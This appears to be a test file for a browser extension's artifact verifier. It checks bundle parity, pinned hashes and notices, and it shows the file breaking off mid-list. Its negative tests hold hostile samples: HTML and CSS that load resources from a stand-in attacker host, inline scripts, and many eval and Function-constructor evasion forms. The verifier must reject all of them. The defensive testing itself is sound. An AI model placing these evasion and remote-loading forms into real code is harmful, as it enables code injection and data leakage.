import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { readFileSync } from "node:fs";
import { dirname, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import test from "node:test";
import * as browserPackageContract from "../browser-package-contract.mjs";
import * as artifactVerifier from "../verify-artifacts.mjs";
import {
  loadChromiumNativeRuntimeNoticeInputs,
  renderChromiumDerivedNoticeSection,
  renderChromiumNativeRuntimeNoticeSection,
} from "../browser-bundle-notices.mjs";

const {
  BROWSER_ARCHIVE_FILES,
  validateBrowserArchive,
} = artifactVerifier;

const repositoryRoot = resolve(dirname(fileURLToPath(import.meta.url)), "../..");
const inspectorPanelHtml = readFileSync(
  resolve(
    repositoryRoot,
    "packages/browser-extension-core/assets/inspector-panel.html",
  ),
  "utf8",
);
const panelCss = readFileSync(
  resolve(repositoryRoot, "packages/browser-extension-core/assets/panel.css"),
  "utf8",
);
const elementsCss = readFileSync(
  resolve(
    repositoryRoot,
    "packages/devtools-elements-ui/assets/devtools-elements.css",
  ),
  "utf8",
);
const panelBundle = [
  'const sourcePresentationCapability = "source-presentation";',
  'const sourceMatchesType = "source.matches";',
  'const sourceOpenType = "source.open";',
  'const sourceNavigateType = "source.navigate";',
  'const navigationStateType = "source.navigationState";',
  'const opaqueMatchIdentity = "matchId";',
  'const resolveLocatorType = "dom.resolveLocator";',
  "",
].join("\n");
const inspectorPanelBundle = [
  'import { createElementsInspectorView } from "./chromiumElementsRuntime.js";',
  'const inspectorWorkspace = "inspector-workspace";',
  'const matchedStylesRequest = "styles.getMatched";',
  'const setPseudoStatesRequest = "styles.setPseudoStates";',
  'const pseudoStatesResponse = "styles.pseudoStates";',
  'const pseudoStateRevision = "pseudoStateRevision";',
  'const previewLabelPrefix = "Preview :";',
  'const pseudoStateAttribute = "data-pseudo-state";',
  'const boundedPseudoStates = ["hover","focus"];',
  'const rulesReadOnlyState = "aria-readonly";',
  'const rulesRenderer = "Rules";',
  'const rulesSourcesPublication = "rules.sources";',
  'const rulesOpenIntent = "pin-op.rules.open";',
  'const rulesSourcePublicationShape = {inspectMessageId:"inspect-1",rulesGeneration:1,openAuthorityId:"authority-1",ruleRef:{},sources:[{document:{label:"style.scss",languageId:"scss"},startLine:1,startColumn:1,confidence:"exact"}],unresolvedRuleCount:0,metadata:{}};',
  "",
].join("\n");
const chromiumElementsRuntimeBundle = [
  'const readOnlyRules = "aria-readonly Rules";',
  'const previewLabelPrefix = "Preview :";',
  'const pseudoStateAttribute = "data-pseudo-state";',
  'const createFactory = () => readOnlyRules + previewLabelPrefix + pseudoStateAttribute;',
  'export { createFactory as createElementsInspectorView };',
  "",
].join("\n");
const contentScriptBundle = [
  'const selectionMarker = "data-pin-op-preview-selected-";',
  'const hoverMarker = "data-pin-op-preview-hover-";',
  'const focusMarker = "data-pin-op-preview-focus-";',
  'const runtimeStyleMarker = "data-pin-op-runtime-";',
  'const runtimeArtifactNodeExclusion = "isRuntimeArtifactNode";',
  'const runtimeArtifactAttributeExclusion = "isRuntimeArtifactAttributeName";',
  'const runtimeArtifactMutationExclusion = "isRuntimeArtifactAttributeMutation";',
].join("\n");
const backgroundBundle = [
  'const rulesSourcesCapability = "rules-sources";',
  'const rulesSourcesType = "rules.sources";',
  'const rulesOpenType = "rules.open";',
  'const panelRulesOpenType = "pin-op.rules.open";',
  'const rulesSourcePublicationShape = {inspectMessageId:"inspect-1",rulesGeneration:1,openAuthorityId:"authority-1",ruleRef:{},sources:[{document:{label:"style.scss",languageId:"scss"},startLine:1,startColumn:1,confidence:"exact"}],unresolvedRuleCount:0,metadata:{}};',
  "",
].join("\n");

function compiledPanelRuntime(panelPage) {
  return [
    "function compiledPanelPage() {",
    `  const value = "${panelPage}";`,
    '  if (value === "/dist/inspector-panel.html") return value;',
    '  throw new Error("Invalid compiled panel page");',
    "}",
    "const activePanelPage = compiledPanelPage();",
    "",
  ].join("\n");
}
const INSPECTOR_PANEL_PAGE = "/dist/inspector-panel.html";
const acceptedBrowserPanelPages = new Map();
const upstreamManifest = JSON.parse(
  readFileSync(
    resolve(repositoryRoot, "third_party/chromium-devtools-frontend/UPSTREAM.json"),
    "utf8",
  ),
);
const upstreamRootLicenseBytes = readFileSync(
  resolve(repositoryRoot, "third_party/chromium-devtools-frontend/LICENSE"),
  "utf8",
);
const upstreamRootLicense = upstreamRootLicenseBytes
  .replaceAll("\r\n", "\n")
  .trim();
const chromiumDerivedNoticeSection = renderChromiumDerivedNoticeSection(
  upstreamManifest,
  upstreamRootLicenseBytes,
);
const chromiumNativeRuntimeNoticeSection = renderChromiumNativeRuntimeNoticeSection(
  await loadChromiumNativeRuntimeNoticeInputs(repositoryRoot),
);
const nativeRuntimeBytes = readFileSync(
  resolve(repositoryRoot, "third_party/chromium-devtools-frontend/RUNTIME.json"),
);
const nativeRuntime = JSON.parse(nativeRuntimeBytes.toString("utf8"));
const nativeStylesManifestPath =
  `third_party/chromium-devtools-frontend/styles-overlay/${nativeRuntime.package.version}/manifest.json`;
const nativeStylesManifestBytes = readFileSync(
  resolve(repositoryRoot, nativeStylesManifestPath),
);
const nativeStylesManifest = JSON.parse(nativeStylesManifestBytes.toString("utf8"));
const nativeCodeMirrorLicense = readFileSync(
  resolve(
    repositoryRoot,
    "node_modules/chrome-devtools-frontend/front_end/third_party/codemirror.next/LICENSE",
  ),
  "utf8",
).replaceAll("\r\n", "\n").trim();

// Pin raw canonical protocol-v7 archive bytes for the reviewed zod@3.25.76
// schema clone and the two pinned PostCSS AST clones emitted by esbuild.
// Retaining those helpers after dependency/build changes requires a security
// review before deliberately updating this list.
const EXPECTED_ZOD_V3_BUNDLE_PROVENANCE = Object.freeze([
  { browser: "chrome", path: "dist/background.js", sha256: "39ba192668fb1abe7b1f8a372f0edcf16835ecc542fffed9f09634d45bae3e70" },
  { browser: "chrome", path: "dist/contentScript.js", sha256: "2f37f200aa61d63f952dbe5e3a8d647034c20300817e0cb43095c43e41a5a2ec" },
  { browser: "chrome", path: "dist/devtools.js", sha256: "8cf715868fb47f7e2b01c38d6ccc51bf55e3ec481f773e86952ad34a27bb214f" },
  { browser: "chrome", path: "dist/inspectorPanel.js", sha256: "8d4d01778ad07440e06135d982c68818fad0ae6639382622598912db0237189a" },
  { browser: "chrome", path: "dist/chromiumElementsRuntime.js", sha256: "37065ae9f2b4573f951babe2dd68196a34c7d9614a80abe569b2ae886a93f1b4" },
  { browser: "firefox", path: "dist/background.js", sha256: "39ba192668fb1abe7b1f8a372f0edcf16835ecc542fffed9f09634d45bae3e70" },
  { browser: "firefox", path: "dist/contentScript.js", sha256: "2f37f200aa61d63f952dbe5e3a8d647034c20300817e0cb43095c43e41a5a2ec" },
  { browser: "firefox", path: "dist/devtools.js", sha256: "d03cc2ae0bd3fc8867359c07844b153dfa483fc603963d6bc8246806181e1fa6" },
  { browser: "firefox", path: "dist/inspectorPanel.js", sha256: "8d4d01778ad07440e06135d982c68818fad0ae6639382622598912db0237189a" },
  { browser: "firefox", path: "dist/chromiumElementsRuntime.js", sha256: "37065ae9f2b4573f951babe2dd68196a34c7d9614a80abe569b2ae886a93f1b4" },
]);

test("browser runtime contract pins reviewed constructor-clone provenance per browser and path", () => {
  assert.deepEqual(
    browserPackageContract.TRUSTED_ZOD_V3_BUNDLE_PROVENANCE,
    EXPECTED_ZOD_V3_BUNDLE_PROVENANCE,
  );
});

const requiredMarkers = [
  {
    label: "Inspector workspace",
    path: "dist/inspector-panel.html",
    marker: 'id="inspector-workspace"',
  },
  {
    label: "Inspector mount",
    path: "dist/inspector-panel.html",
    marker: 'id="inspector-elements-mount"',
  },
  {
    label: "pseudo-state button selector",
    path: "dist/devtools-elements.css",
    marker: ".pseudo-state-button",
  },
  {
    label: "pseudo-state menu selector",
    path: "dist/devtools-elements.css",
    marker: ".pseudo-state-menu",
  },
  {
    label: "responsive toolbar",
    path: "dist/panel.css",
    marker: ".panel-toolbar-scroll",
  },
  {
    label: "source excerpt style",
    path: "dist/panel.css",
    marker: ".source-pane-excerpt",
  },
  {
    label: "Rules source publication",
    path: "dist/inspectorPanel.js",
    marker: "rules.sources",
  },
  {
    label: "pseudo-state request",
    path: "dist/inspectorPanel.js",
    marker: "styles.setPseudoStates",
  },
  {
    label: "pseudo-state response",
    path: "dist/inspectorPanel.js",
    marker: "styles.pseudoStates",
  },
  {
    label: "pseudo-state revision",
    path: "dist/inspectorPanel.js",
    marker: "pseudoStateRevision",
  },
  {
    label: "pseudo-state label prefix",
    path: "dist/chromiumElementsRuntime.js",
    marker: "Preview :",
  },
  {
    label: "pseudo-state control attribute",
    path: "dist/chromiumElementsRuntime.js",
    marker: "data-pseudo-state",
  },
  {
    label: "bounded pseudo-state list",
    path: "dist/inspectorPanel.js",
    marker: '["hover","focus"]',
  },
  {
    label: "Rules source open intent",
    path: "dist/inspectorPanel.js",
    marker: "pin-op.rules.open",
  },
  {
    label: "Rules inspect correlation",
    path: "dist/inspectorPanel.js",
    marker: "inspectMessageId:",
  },
  {
    label: "Rules generation",
    path: "dist/inspectorPanel.js",
    marker: "rulesGeneration:",
  },
  {
    label: "Rules open authority",
    path: "dist/inspectorPanel.js",
    marker: "openAuthorityId:",
  },
  {
    label: "Rules publication rule reference",
    path: "dist/inspectorPanel.js",
    marker: "ruleRef:",
  },
  {
    label: "Rules publication sources",
    path: "dist/inspectorPanel.js",
    marker: "sources:",
  },
  {
    label: "Rules unresolved count",
    path: "dist/inspectorPanel.js",
    marker: "unresolvedRuleCount:",
  },
  ...[
    ["Rules source document", "document:"],
    ["Rules source label", "label:"],
    ["Rules source language", "languageId:"],
    ["Rules source start line", "startLine:"],
    ["Rules source start column", "startColumn:"],
    ["Rules source confidence", "confidence:"],
  ].map(([label, marker]) => ({
    label,
    path: "dist/inspectorPanel.js",
    marker,
  })),
  {
    label: "Rules source capability",
    path: "dist/background.js",
    marker: "rules-sources",
  },
  {
    label: "Rules source publication",
    path: "dist/background.js",
    marker: "rules.sources",
  },
  {
    label: "Rules source open",
    path: "dist/background.js",
    marker: "rules.open",
  },
  {
    label: "Rules source open intent",
    path: "dist/background.js",
    marker: "pin-op.rules.open",
  },
  {
    label: "Rules inspect correlation",
    path: "dist/background.js",
    marker: "inspectMessageId:",
  },
  {
    label: "Rules generation",
    path: "dist/background.js",
    marker: "rulesGeneration:",
  },
  {
    label: "Rules open authority",
    path: "dist/background.js",
    marker: "openAuthorityId:",
  },
  {
    label: "Rules publication rule reference",
    path: "dist/background.js",
    marker: "ruleRef:",
  },
  {
    label: "Rules publication sources",
    path: "dist/background.js",
    marker: "sources:",
  },
  {
    label: "Rules unresolved count",
    path: "dist/background.js",
    marker: "unresolvedRuleCount:",
  },
  ...[
    ["Rules source document", "document:"],
    ["Rules source label", "label:"],
    ["Rules source language", "languageId:"],
    ["Rules source start line", "startLine:"],
    ["Rules source start column", "startColumn:"],
    ["Rules source confidence", "confidence:"],
  ].map(([label, marker]) => ({
    label,
    path: "dist/background.js",
    marker,
  })),
  ...[
    ["selection preview marker", "data-pin-op-preview-selected-"],
    ["hover preview marker", "data-pin-op-preview-hover-"],
    ["focus preview marker", "data-pin-op-preview-focus-"],
    ["runtime style marker", "data-pin-op-runtime-"],
    ["runtime artifact node exclusion", "isRuntimeArtifactNode"],
    ["runtime artifact attribute exclusion", "isRuntimeArtifactAttributeName"],
    ["runtime artifact mutation exclusion", "isRuntimeArtifactAttributeMutation"],
  ].map(([label, marker]) => ({
    label,
    path: "dist/contentScript.js",
    marker,
  })),
];

test("browser artifact inventory includes the Inspector default and legacy rollback", () => {
  for (const path of [
    "dist/inspector-panel.html",
    "dist/inspectorPanel.js",
    "dist/chromiumElementsRuntime.js",
    "dist/devtools-elements.css",
  ]) {
    assert.ok(BROWSER_ARCHIVE_FILES.includes(path), path);
  }
});

test("browser artifact verifier requires byte-identical derived assets and notices", () => {
  assert.equal(typeof artifactVerifier.assertBrowserInspectorParity, "function");
  const chrome = browserArchive("chrome");
  const firefox = browserArchive("firefox");
  assert.doesNotThrow(() =>
    artifactVerifier.assertBrowserInspectorParity(chrome, firefox),
  );

  firefox.files.set("dist/devtools-elements.css", Buffer.from(`${elementsCss}\n/* drift */\n`));
  assert.throws(
    () => artifactVerifier.assertBrowserInspectorParity(chrome, firefox),
    /devtools-elements\.css.*byte-identical/i,
  );

  firefox.files.set("dist/devtools-elements.css", Buffer.from(elementsCss));
  firefox.files.set(
    "dist/inspector-panel.html",
    Buffer.from(`${inspectorPanelHtml}\n<!-- drift -->\n`),
  );
  assert.throws(
    () => artifactVerifier.assertBrowserInspectorParity(chrome, firefox),
    /inspector-panel\.html.*byte-identical/i,
  );

  firefox.files.set("dist/inspector-panel.html", Buffer.from(inspectorPanelHtml));
  firefox.files.set(
    "dist/inspectorPanel.js",
    Buffer.from(`${inspectorPanelBundle}\n// drift\n`),
  );
  assert.throws(
    () => artifactVerifier.assertBrowserInspectorParity(chrome, firefox),
    /inspectorPanel\.js.*byte-identical/i,
  );

  firefox.files.set("dist/inspectorPanel.js", Buffer.from(inspectorPanelBundle));
  firefox.files.set(
    "dist/chromiumElementsRuntime.js",
    Buffer.from(`${chromiumElementsRuntimeBundle}\n// drift\n`),
  );
  assert.throws(
    () => artifactVerifier.assertBrowserInspectorParity(chrome, firefox),
    /chromiumElementsRuntime\.js.*byte-identical/i,
  );

  firefox.files.set(
    "dist/chromiumElementsRuntime.js",
    Buffer.from(chromiumElementsRuntimeBundle),
  );
  firefox.files.set(
    "THIRD_PARTY_NOTICES",
    Buffer.from(`${firefox.files.get("THIRD_PARTY_NOTICES")}\nnotice drift\n`),
  );
  assert.throws(
    () => artifactVerifier.assertBrowserInspectorParity(chrome, firefox),
    /Chromium.*notice.*identical/i,
  );
});

test("top-level artifact verification invokes cross-browser Inspector parity", () => {
  const verifierSource = readFileSync(
    resolve(repositoryRoot, "tools/verify-artifacts.mjs"),
    "utf8",
  );
  assert.match(
    verifierSource,
    /export async function verifyArtifacts[\s\S]*?assertBrowserInspectorParity\(\s*browserArchives\.get\("chrome"\),\s*browserArchives\.get\("firefox"\),/,
  );
});

for (const browser of ["firefox", "chrome"]) {
  test(`common ${browser} artifact verifier accepts protocol v7 and the Inspector default`, () => {
    assert.doesNotThrow(() =>
      validateBrowserArchive(
        browserArchive(browser, INSPECTOR_PANEL_PAGE),
        `pin-op-${browser}-0.5.0.zip`,
        browser,
      ),
    );
  });

  test(`common ${browser} artifact verifier accepts toolbar class tokens in any order`, () => {
    const archive = browserArchive(browser);
    const panel = archive.files.get("dist/inspector-panel.html").toString("utf8");
    const reordered = panel.replace(
      'class="panel-toolbar"',
      "class='secondary panel-toolbar primary'",
    );
    assert.notEqual(reordered, panel);
    archive.files.set("dist/inspector-panel.html", Buffer.from(reordered));

    assert.doesNotThrow(() =>
      validateBrowserArchive(
        archive,
        `pin-op-${browser}-0.5.0.zip`,
        browser,
      ),
    );
  });

  for (const path of [
    "dist/inspector-panel.html",
    "dist/inspectorPanel.js",
    "dist/chromiumElementsRuntime.js",
    "dist/devtools-elements.css",
  ]) {
    test(`common ${browser} artifact verifier requires ${path}`, () => {
      const archive = browserArchive(browser);
      archive.files.delete(path);
      archive.paths = archive.paths.filter((candidate) => candidate !== path);

      assert.throws(
        () => validateBrowserArchive(
          archive,
          `pin-op-${browser}-0.5.0.zip`,
          browser,
        ),
        new RegExp(`missing archive path ${escapeRegex(path)}`, "i"),
      );
    });
  }

  test(`common ${browser} artifact verifier rejects unscoped Chromium CSS`, () => {
    for (const rule of [
      ".elements-tree-outline { color: red; }",
      "@media all { .elements-tree-outline { color: red; } }",
      ".pin-op-elements-inspector + .victim { color: red; }",
      ".pin-op-elements-inspector ~ .victim { color: red; }",
      ".pin-op-elements-inspector || td { color: red; }",
      ".pin-op-elements-inspector-evil { color: red; }",
      "@property --victim { syntax: '<color>'; inherits: false; initial-value: red; }",
      "@keyframes pulse { from { opacity: 0; } to { opacity: 1; } }",
    ]) {
      const archive = browserArchive(browser);
      archive.files.set(
        "dist/devtools-elements.css",
        Buffer.from(`${elementsCss}\n${rule}\n`),
      );

      assert.throws(
        () => validateBrowserArchive(
          archive,
          `pin-op-${browser}-0.5.0.zip`,
          browser,
        ),
        /(?:unscoped|global).*Chromium.*CSS/i,
        rule,
      );
    }
  });

  test(`common ${browser} artifact verifier allows scoped Chromium keyframes`, () => {
    const archive = browserArchive(browser);
    archive.files.set(
      "dist/devtools-elements.css",
      Buffer.from(`${elementsCss}\n` +
        "@keyframes pin-op-elements-pulse {\n" +
        "  from { opacity: 0; }\n" +
        "  50% { opacity: 0.5; }\n" +
        "  to { opacity: 1; }\n" +
        "}\n" +
        ".pin-op-elements-inspector .pulse { animation: pin-op-elements-pulse 1s; }\n"),
    );

    assert.doesNotThrow(() => validateBrowserArchive(
      archive,
      `pin-op-${browser}-0.5.0.zip`,
      browser,
    ));
  });

  test(`common ${browser} artifact verifier rejects remote Chromium CSS resources`, () => {
    for (const path of ["dist/panel.css", "dist/devtools-elements.css"]) {
      for (const rule of [
        '@import url("https://attacker.test/ui.css");',
        `${path === "dist/devtools-elements.css" ? ".pin-op-elements-inspector" : "body"} ` +
          '{ background: url("//attacker.test/ui.png"); }',
        `${path === "dist/devtools-elements.css" ? ".pin-op-elements-inspector" : "body"} ` +
          "{ background: url(h\\74tps://attacker.test/escaped-scheme.png); }",
        `${path === "dist/devtools-elements.css" ? ".pin-op-elements-inspector" : "body"} ` +
          "{ background: u\\72l(https://attacker.test/escaped-function.png); }",
        `${path === "dist/devtools-elements.css" ? ".pin-op-elements-inspector" : "body"} ` +
          "{ background: u/**/rl(https://attacker.test/commented-function.png); }",
        `${path === "dist/devtools-elements.css" ? ".pin-op-elements-inspector" : "body"} ` +
          '{ background: image-set("https://attacker.test/image-set.png" 1x); }',
        `${path === "dist/devtools-elements.css" ? ".pin-op-elements-inspector" : "body"} ` +
          '{ background: -webkit-image-set("https://attacker.test/webkit-image-set.png" 1x); }',
        `${path === "dist/devtools-elements.css" ? ".pin-op-elements-inspector" : "body"} ` +
          "{ background: url(\"https:\\\n//attacker.test/continued.png\"); }",
      ]) {
        const archive = browserArchive(browser);
        const css = archive.files.get(path).toString("utf8");
        archive.files.set(path, Buffer.from(`${css}\n${rule}\n`));

        assert.throws(
          () => validateBrowserArchive(
            archive,
            `pin-op-${browser}-0.5.0.zip`,
            browser,
          ),
          /(?:remote.*CSS|invalid static CSS.*import)/i,
          `${path}: ${rule}`,
        );
      }
    }
  });

  test(`common ${browser} artifact verifier rejects remote Inspector UI resources`, () => {
    for (const path of ["dist/inspector-panel.html"]) {
      for (const resource of [
        '<script src="https://attacker.test/ui.js"></script>',
        '<link rel="stylesheet" href="https://attacker.test/ui.css" />',
        '<img src="//attacker.test/ui.png" alt="" />',
        '<iframe src="https://attacker.test/ui.html"></iframe>',
        '<object data="https://attacker.test/ui.html"></object>',
        '<embed src="https://attacker.test/ui.html" />',
        '<video src="https://attacker.test/ui.mp4"></video>',
        '<audio src="https://attacker.test/ui.mp3"></audio>',
        '<source src="https://attacker.test/ui.webp" />',
      ]) {
        const archive = browserArchive(browser);
        const html = archive.files.get(path).toString("utf8");
        archive.files.set(
          path,
          Buffer.from(html.replace("</head>", `${resource}\n</head>`)),
        );

        assert.throws(
          () => validateBrowserArchive(
            archive,
            `pin-op-${browser}-0.5.0.zip`,
            browser,
          ),
          /remote UI resource/i,
          `${path}: ${resource}`,
        );
      }
    }
  });

  test(`common ${browser} artifact verifier requires the Inspector module graph`, () => {
    const classicArchive = browserArchive(browser);
    const inspectorHtml = classicArchive.files
      .get("dist/inspector-panel.html")
      .toString("utf8");
    classicArchive.files.set(
      "dist/inspector-panel.html",
      Buffer.from(inspectorHtml.replace(' type="module"', "")),
    );
    assert.throws(
      () => validateBrowserArchive(
        classicArchive,
        `pin-op-${browser}-0.5.0.zip`,
        browser,
      ),
      /unexpected module scripts/i,
    );

    const bareImportArchive = browserArchive(browser);
    const inspectorBundle = bareImportArchive.files
      .get("dist/inspectorPanel.js")
      .toString("utf8");
    bareImportArchive.files.set(
      "dist/inspectorPanel.js",
      Buffer.from(inspectorBundle.replace(
        "./chromiumElementsRuntime.js",
        "@pin-op/devtools-elements-ui/upstream-runtime",
      )),
    );
    assert.throws(
      () => validateBrowserArchive(
        bareImportArchive,
        `pin-op-${browser}-0.5.0.zip`,
        browser,
      ),
      /must statically import exactly \.\/chromiumElementsRuntime\.js/i,
    );

    const unbundledRuntimeArchive = browserArchive(browser);
    const elementsRuntime = unbundledRuntimeArchive.files
      .get("dist/chromiumElementsRuntime.js")
      .toString("utf8");
    unbundledRuntimeArchive.files.set(
      "dist/chromiumElementsRuntime.js",
      Buffer.from(`import "./transitive.js";\n${elementsRuntime}`),
    );
    assert.throws(
      () => validateBrowserArchive(
        unbundledRuntimeArchive,
        `pin-op-${browser}-0.5.0.zip`,
        browser,
      ),
      /must be a bundled ESM module/i,
    );

    const reexportedRuntimeArchive = browserArchive(browser);
    const reexportedElementsRuntime = reexportedRuntimeArchive.files
      .get("dist/chromiumElementsRuntime.js")
      .toString("utf8");
    reexportedRuntimeArchive.files.set(
      "dist/chromiumElementsRuntime.js",
      Buffer.from(
        'export { createElementsInspectorView } from "./transitive.js";\n' +
          reexportedElementsRuntime,
      ),
    );
    assert.throws(
      () => validateBrowserArchive(
        reexportedRuntimeArchive,
        `pin-op-${browser}-0.5.0.zip`,
        browser,
      ),
      /must be a bundled ESM module/i,
    );
  });

  test(`common ${browser} artifact verifier rejects indirect Inspector UI resources`, () => {
    for (const path of ["dist/inspector-panel.html"]) {
      for (const resource of [
        '<base href="https://attacker.test/" />',
        '<img srcset="https://attacker.test/ui.png 1x, ./local.png 2x" alt="" />',
        '<source srcset="//attacker.test/ui.webp 1x" />',
        '<svg><image href="https://attacker.test/ui.svg"></image></svg>',
        '<svg xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="//attacker.test/ui.svg"></image></svg>',
        '<svg><use href="https://attacker.test/ui.svg#icon"></use></svg>',
        '<svg><feImage href="https://attacker.test/ui.png"></feImage></svg>',
        '<svg><filter href="https://attacker.test/filter.svg#filter"></filter></svg>',
        '<svg><rect filter="url(https://attacker.test/filter.svg#filter)"></rect></svg>',
        '<svg><rect fill="url(https://attacker.test/paint.svg#paint)"></rect></svg>',
        '<svg><rect stroke="url(https://attacker.test/paint.svg#paint)"></rect></svg>',
        '<svg><path marker-start="url(https://attacker.test/paint.svg#marker)"></path></svg>',
        '<svg><linearGradient href="https://attacker.test/paint.svg#gradient"></linearGradient></svg>',
        '<svg><pattern href="https://attacker.test/paint.svg#pattern"></pattern></svg>',
        '<svg><textPath href="https://attacker.test/paint.svg#text">text</textPath></svg>',
        '<link rel="preload" as="image" href="./pin-op.svg" imagesrcset="https://attacker.test/ui.png" />',
        '<body background="https://attacker.test/ui.png"></body>',
        '<table background="https://attacker.test/ui.png"></table>',
        '<a href="https://attacker.test/ui.html">remote</a>',
        '<a href="https://conus.vision" ping="https://attacker.test/ping">approved link</a>',
        '<area href="https://attacker.test/ui.html" />',
        '<form action="https://attacker.test/submit"></form>',
        '<button formaction="https://attacker.test/submit">submit</button>',
        '<iframe srcdoc="&lt;style&gt;body { display: none; }&lt;/style&gt;"></iframe>',
        '<meta http-equiv="refresh" content="0; url=https://attacker.test/ui.html" />',
      ]) {
        const archive = browserArchive(browser);
        const html = archive.files.get(path).toString("utf8");
        archive.files.set(
          path,
          Buffer.from(html.replace("</head>", `${resource}\n</head>`)),
        );

        assert.throws(
          () => validateBrowserArchive(
            archive,
            `pin-op-${browser}-0.5.0.zip`,
            browser,
          ),
          /(?:remote UI resource|srcset|srcdoc|meta refresh|inline frame)/i,
          `${path}: ${resource}`,
        );
      }
    }
  });

  test(`common ${browser} artifact verifier rejects every indirect paint and beacon resource`, () => {
    const accepted = [];
    const wrongReason = [];
    for (const resource of [
      '<svg><rect fill="url(https://attacker.test/paint.svg#paint)"></rect></svg>',
      '<svg><rect stroke="url(https://attacker.test/paint.svg#paint)"></rect></svg>',
      '<svg><path marker-start="url(https://attacker.test/paint.svg#marker)"></path></svg>',
      '<svg><linearGradient href="https://attacker.test/paint.svg#gradient"></linearGradient></svg>',
      '<svg><pattern href="https://attacker.test/paint.svg#pattern"></pattern></svg>',
      '<svg><textPath href="https://attacker.test/paint.svg#text">text</textPath></svg>',
      '<a href="https://conus.vision" ping="https://attacker.test/ping">approved link</a>',
      '<table background="https://attacker.test/ui.png"></table>',
    ]) {
      const archive = browserArchive(browser);
      const path = "dist/inspector-panel.html";
      const html = archive.files.get(path).toString("utf8");
      archive.files.set(
        path,
        Buffer.from(html.replace("</body>", `${resource}\n</body>`)),
      );

      try {
        validateBrowserArchive(
          archive,
          `pin-op-${browser}-0.5.0.zip`,
          browser,
        );
        accepted.push(resource);
      } catch (error) {
        if (!/remote UI resource/i.test(String(error))) {
          wrongReason.push(`${resource}: ${String(error)}`);
        }
      }
    }

    assert.deepEqual(wrongReason, []);
    assert.deepEqual(accepted, []);
  });

  test(`common ${browser} artifact verifier rejects inline panel code and styles`, () => {
    for (const path of ["dist/inspector-panel.html"]) {
      for (const injection of [
        "<script>globalThis.attack = true;</script>",
        "<style>body { display: block; }</style>",
        '<div style="display:block"></div>',
        '<button onclick="attack()"></button>',
      ]) {
        const archive = browserArchive(browser);
        const html = archive.files.get(path).toString("utf8");
        archive.files.set(
          path,
          Buffer.from(html.replace("</body>", `${injection}\n</body>`)),
        );

        assert.throws(
          () => validateBrowserArchive(
            archive,
            `pin-op-${browser}-0.5.0.zip`,
            browser,
          ),
          /inline (?:script|style|event)/i,
          `${path}: ${injection}`,
        );
      }
    }
  });

  test(`common ${browser} artifact verifier rejects dynamic code and upstream snapshot imports`, () => {
    for (const path of [
      "dist/background.js",
      "dist/contentScript.js",
      "dist/devtools.js",
      "dist/inspectorPanel.js",
      "dist/chromiumElementsRuntime.js",
    ]) {
      for (const marker of [
        'eval("attack")',
        'new Function("attack")',
        'Function("attack")()',
        '(0, eval)("attack")',
        '(0, Function)("attack")()',
        'globalThis.eval("attack")',
        'globalThis["Function"]("attack")()',
        'eval.call(globalThis, "attack")',
        'const indirectEval = eval; indirectEval("attack")',
        'const FunctionAlias = Function; FunctionAlias("attack")()',
        'Reflect.construct(Function, ["attack"])',
        'const computedEval = globalThis["ev" + "al"]; computedEval("attack")',
        'const computedFunction = globalThis["Fun" + "ction"]; computedFunction("attack")()',
        'const globalAlias = globalThis; globalAlias.eval("attack")',
        'const functionGlobalAlias = globalThis; functionGlobalAlias.Function("attack")()',
        'const loader = importScripts; loader("https://attacker.test/ui.js")',
        'globalThis["import" + "Scripts"]("https://attacker.test/ui.js")',
        'self["importScripts"]("https://attacker.test/ui.js")',
        '(() => {}).constructor("return 1")()',
        'Function.call(null, "return 1")()',
        'Function.apply(null, ["return 1"])()',
        'Function.bind(null, "return 1")()()',
        'Function.call.bind(Function)(null, "return 1")()',
        'Function.call.bind(eval)(null, "1")',
        'Function.call.apply(Function, [null, "return 1"])()',
        'Function.call.bind(Object.prototype.hasOwnProperty, Function)',
        'Object.constructor("return 1")()',
        'new Object.constructor("return 1")',
        'Function.prototype.constructor("return 1")()',
        '({}).constructor.constructor("return 1")()',
        'const localArrow = () => {}; localArrow.constructor("return 1")()',
        'function localFunction() {} localFunction.constructor("return 1")()',
        '[].filter.constructor("return 1")()',
        'Math.max.constructor("return 1")()',
        'Object.prototype.hasOwnProperty.constructor("return 1")()',
        'new ([].filter.constructor)("return 1")',
        '[].filter.constructor`return 1`()',
        'const ConstructorAlias = [].filter.constructor; ConstructorAlias("return 1")()',
        'const assignedSource = () => {}; let AssignedConstructor; AssignedConstructor = assignedSource.constructor; AssignedConstructor("return 1")()',
        'class DangerousDescribe { describe(code) { const Constructor = this.constructor; return Constructor(code); } }',
        'class DangerousClone { describe(code) { const Constructor = this.constructor; return new Constructor(code); } }',
        'class CopiedSchema { describe(description) { const Constructor = this.constructor; return new Constructor({...this._def, description}); } } function LocalFunction() {} LocalFunction._def = { toString() { return "return 1"; } }; CopiedSchema.prototype.describe.call(LocalFunction, "x")()',
        'class CopiedPrimitiveSchema { describe(description) { const Constructor = this.constructor; return new Constructor({...this._def, description}); } } function PrimitiveFunction() {} PrimitiveFunction._def = { [Symbol.toPrimitive]() { return "return 1"; } }; CopiedPrimitiveSchema.prototype.describe.call(PrimitiveFunction, "x")()',
        'Function`return 1`()',
        'Object.constructor`return 1`()',
        'let assignedFunction; assignedFunction = Function; assignedFunction("return 1")()',
        'let assignedEval; assignedEval = eval; assignedEval("1")',
        'let assignedLoader; assignedLoader = importScripts; assignedLoader("https://attacker.test/ui.js")',
        'const { Function: destructuredFunction } = globalThis; destructuredFunction("return 1")()',
        'const { eval: destructuredEval } = globalThis; destructuredEval("1")',
        '(capability => capability("return 1")())(Function)',
        '(() => Function)()("return 1")()',
        'import("https://attacker.test/ui.js")',
        'const upstreamSnapshotPath = "third_party/chromium-devtools-frontend/upstream/front_end/panels/elements/ElementsTreeOutline.ts"',
      ]) {
        const archive = browserArchive(browser);
        const bundle = archive.files.get(path).toString("utf8");
        archive.files.set(path, Buffer.from(`${bundle}\n${marker}\n`));

        assert.throws(
          () => validateBrowserArchive(
            archive,
            `pin-op-${browser}-0.5.0.zip`,
            browser,
          ),
          /(?:dynamic code|remote code|upstream snapshot)/i,
          `${path}: ${marker}`,
        );
      }
    }
  });

  test(`common ${browser} artifact verifier rejects every capability laundering form`, () => {
    const accepted = [];
    const wrongReason = [];
    for (const marker of [
      'Function.call.bind(Function)(null, "return 1")()',
      'Function.call.bind(eval)(null, "1")',
      'Function.call.apply(Function, [null, "return 1"])()',
      'Function.call.bind(Object.prototype.hasOwnProperty, Function)',
      'Object.constructor("return 1")()',
